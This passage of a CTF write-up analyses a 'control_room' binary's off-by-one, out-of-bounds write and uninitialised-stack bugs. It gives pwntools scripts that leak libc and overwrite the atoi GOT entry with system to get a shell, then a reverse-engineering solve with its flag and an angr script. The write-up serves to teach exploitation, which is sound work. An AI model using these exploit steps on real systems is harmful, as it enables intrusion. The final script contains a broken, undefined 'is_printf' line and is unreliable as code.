&#125;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;All engines are configured correctly.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only technicians are allowed to check the engines.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this function seems to bug free</p><p>change_route function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change_route</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> sVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  undefined8 local_58 [<span class="number">4</span>];</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_13;</span><br><span class="line">  undefined local_11;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_13 = <span class="number">0</span>;</span><br><span class="line">  local_11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&lt;===[ Coordinates [%d] ]===&gt;\n&quot;</span>,(ulong)(i + <span class="number">1</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tLatitude  : &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e,local_58 + (<span class="type">long</span>)i * <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\tLongitude : &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;DAT_0040330e);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDo you want to save the route? (y/n) &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&gt; &quot;</span>);</span><br><span class="line">    fgets((<span class="type">char</span> *)&amp;local_13,<span class="number">3</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    sVar2 = <span class="built_in">strcspn</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)&amp;local_13 + sVar2) = <span class="number">0</span>;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>((<span class="type">char</span> *)&amp;local_13,<span class="string">&quot;y&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      route._0_8_ = local_58[<span class="number">0</span>];</span><br><span class="line">      route._8_8_ = local_58[<span class="number">1</span>];</span><br><span class="line">      route._16_8_ = local_58[<span class="number">2</span>];</span><br><span class="line">      route._24_8_ = local_58[<span class="number">3</span>];</span><br><span class="line">      route._32_8_ = local_38;</span><br><span class="line">      route._40_8_ = local_30;</span><br><span class="line">      route._48_8_ = local_28;</span><br><span class="line">      route._56_8_ = local_20;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;The route has been successfully updated!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      log_message(<span class="number">1</span>,<span class="string">&quot;Operation cancelled&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only the captain is allowed to change the ship\&#x27;s route\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Only accessible by Captain.<br>This function contains two errors. The first issue is with how it scans input values. If an invalid input is entered while calling __isoc99_scanf(&amp;DAT_0040330e,local_58 + (long)i * 2); and __isoc99_scanf(&amp;DAT_0040330e); (such as entering a non-numeric character), the scanf function will skip and move to the next line of code. The second problem is that there is no error handling mechanism in place to deal with failed scans, which means that even if the scanf fails, the function will still copy the value stored in the stack to the route variable.</p><p>it is apparent that there is no procedure in place to remove the data from the stack prior to its utilization. This, in combination with the absence of a mechanism to handle failures in the scanf operation, means that it is feasible for the route value to be assigned with data from the stack. If we happen to be fortunate, this could contain some confidential information that must not be disclosed, such as a libc address. This kind of bug is called UDA (Uninitialied Data Access).</p><p>view_route function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">view_route</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Route ]===&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">      print_coordinates(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only the captain is allowed to view the ship\&#x27;s route.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>printing the all route value stored in the stack to the route variable in previous function.</p><p>change_role function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change_role</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;===[ Available roles ]===&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Technician: 1 | Crew: 2&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;New role: &quot;</span>);</span><br><span class="line">    iVar1 = read_num();</span><br><span class="line">    <span class="keyword">if</span> ((iVar1 == <span class="number">1</span>) || (iVar1 == <span class="number">0</span>)) &#123;</span><br><span class="line">      *(<span class="type">int</span> *)(curr_user + <span class="number">0x100</span>) = iVar1;</span><br><span class="line">      log_message(<span class="number">0</span>,<span class="string">&quot;New role has been set successfully!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      log_message(<span class="number">3</span>,<span class="string">&quot;Invalid role.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    log_message(<span class="number">3</span>,<span class="string">&quot;Only Captain is allowed to change roles.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Only accessible if (curr_user + 0x100) &#x3D;&#x3D; 0) i.e Captain, Used to set new role.</p><p>All in once :</p><ol><li><strong>Off-By-One</strong> : We analyzed the <code>user_edit</code> function where we can manage to change the role to 0 i.e. Captain thus we would have changed our role to Captain 0 before menu function </li><li><strong>Out-Of-Bound</strong>: bug in <code>configure_engine</code> where we can OOB Write for addresses before the address of <code>engine</code></li><li><strong>Uninitialised Data Access</strong>: bug in <code>change_route</code> possibly get the leak of libc in <code>view_route</code> function.</li></ol><p><em><strong>Exploitation strategies</strong></em> :</p><ul><li>Need to leak libc using UDA bug in <code>change_route</code> function where will somehow pass the <code>scanf</code> function anticipating to we’ll get addr from libc </li><li>Calculate the base address of libc with leaked address </li><li>overwrite the GOT of leakd libc func to <code>system</code> function from libc using OOB write bug on configure_engine  </li><li>pass the “sh” argument and gain the shell</li></ul><h4 id="Leaking-the-libc-address"><a href="#Leaking-the-libc-address" class="headerlink" title="Leaking the libc address"></a>Leaking the libc address</h4><p><img src="/imgs/post3/pwn/control_room_libc-leak1.png" alt="control_room_libc-leak.png1"></p><p>verifying this address by converting into hex we indeed able to leak libc address we can confirm it using gdb using </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = <span class="string">&quot;./control_room&quot;</span> </span><br><span class="line">elf = context.binary = ELF(elf, checksec=<span class="literal">False</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-linux-x86-64.so.2&quot;)</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        p = process([elf.path])</span><br><span class="line">        <span class="keyword">if</span> args.PLT_DEBUG:</span><br><span class="line">            gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">            pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(remote_url, remote_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = conn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the off-by-one bug</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack UDA, which contains libc address</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;ay&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/control_room_libc-leak2.png" alt="control_room_libc-leak2"></p><p>addr from Coordinates 1 Longitude point to libc function atoi+20 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x <span class="number">140611594499668</span></span><br><span class="line"><span class="number">0</span>x7fe2b0243654 &lt;atoi+<span class="number">20</span>&gt;:       <span class="number">0</span>x08c48348</span><br></pre></td></tr></table></figure><p>so calculate the libc base we have to subtract it to libc.symbols.atoi+20</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = <span class="string">&quot;./control_room&quot;</span> </span><br><span class="line">elf = context.binary = ELF(elf, checksec=<span class="literal">False</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-linux-x86-64.so.2&quot;)</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        p = process([elf.path])</span><br><span class="line">        <span class="keyword">if</span> args.PLT_DEBUG:</span><br><span class="line">            gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">            pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(remote_url, remote_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = conn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the off-by-one bug</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack UDA, which contains libc address</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;ay&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Longitude : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leaked_libc = <span class="built_in">int</span>(p.recvline().strip())</span><br><span class="line">log.info(<span class="string">f&#x27;leaked_libc : <span class="subst">&#123;<span class="built_in">hex</span>(leaked_libc)&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = leaked_libc - (libc.symbols.atoi+<span class="number">20</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got Shell?</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/control_room_libc-leak.png" alt="control_room_libc-leak"></p><h4 id="Gaining-Shell"><a href="#Gaining-Shell" class="headerlink" title="Gaining Shell"></a>Gaining Shell</h4><p>now we have libc base all we need to do is overwrite the GOT <code>atoi</code> with <code>system</code><br>using OOB write bug on <code>configure_engine</code>.</p><p><em><strong>Note</strong></em> :</p><ul><li>We have to calculate the negative index value to find the correct offset to point to the <code>atoi</code> address in <code>configure_engine</code> func</li><li>The purpose of including the value “0x401150” is to prevent our program from crashing. This is because during the configuration of the engine, we are required to write two entries, but we only need one to overwrite “atoi” with “system”. Therefore, we need to ensure that the second value we provide will not cause the program to crash.</li></ul><h3 id="Final-Payload"><a href="#Final-Payload" class="headerlink" title="Final Payload:"></a>Final Payload:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./control_room&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#ld = ELF(&quot;./ld-2.35.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.PLT_DEBUG:</span><br><span class="line">            gdb.attach(r, gdbscript=gdbscript)</span><br><span class="line">            pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(remote_url, remote_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">r = conn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">configure_engine</span>(<span class="params">idx, v1, v2</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>) <span class="comment"># configure Engine</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_printf:</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(v1).encode())</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(v2).encode())</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the off-by-one bug</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack UDA, which contains libc address</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;ay&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Longitude : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leaked_libc = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">log.info(<span class="string">f&#x27;leaked_libc : <span class="subst">&#123;<span class="built_in">hex</span>(leaked_libc)&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = leaked_libc - (libc.symbols.atoi+<span class="number">20</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change role to technician</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">engines_addr = <span class="number">0x405120</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change atoi to system</span></span><br><span class="line"></span><br><span class="line">configure_engine((exe.got[<span class="string">&#x27;atoi&#x27;</span>]-engines_addr) // <span class="number">0x10</span>, libc.symbols.system, <span class="number">0x401150</span>) </span><br><span class="line"><span class="comment"># r.sendline(b&#x27;sh&#x27;) # Trigger a shell</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/pwn/control_room_shell.gif" alt="control_room_shell"></p><h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="Shattered-tablet"><a href="#Shattered-tablet" class="headerlink" title="Shattered tablet"></a>Shattered tablet</h2><p>main func:</p><p><img src="/imgs/post3/rev/shattered_tablet.png" alt="shattered_tablet"></p><p>this challenge suppose to solve with angr but it did it manually using ChatGPT :p(as i didn’t know how to with angr) finding all variable’s value through this giant if condition is tremendious so i asked to CGPT to extract all these variable in descending order and create a list of their respective value and here is<br>result : </p><ul><li>local_48: [‘H’, ‘T’, ‘B’, ‘{‘, ‘b’, ‘r’, ‘0’, ‘k’]</li></ul><ul><li>local_40: [‘3’, ‘n’, ‘_’, ‘4’, ‘p’, ‘4’, ‘r’, ‘t’]</li><li>local_38: [‘,’, ‘n’, ‘3’, ‘v’, ‘e’, ‘r’, ‘_’, ‘t’]</li><li>local_30: [‘0’, ‘<em>‘, ‘b’, ‘3’, ‘</em>‘, ‘r’, ‘3’, ‘p’]</li><li>local_28: [‘4’, ‘1’, ‘r’, ‘3’, ‘d’, ‘}’]</li></ul><p>concatinating values in descending order of each variable and contatinating them create flag</p><p>HTB{br0k3n_4p4rt,n3ver_t0_b3_r3p41r3d}</p><blockquote><p>Edit:  later i learned basic of angr and symbolic execution and came across solution that could be solved using angr python module</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]  <span class="comment"># :string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  print_good_address = <span class="number">0x401359</span>  <span class="comment"># target address</span></span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line"></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span 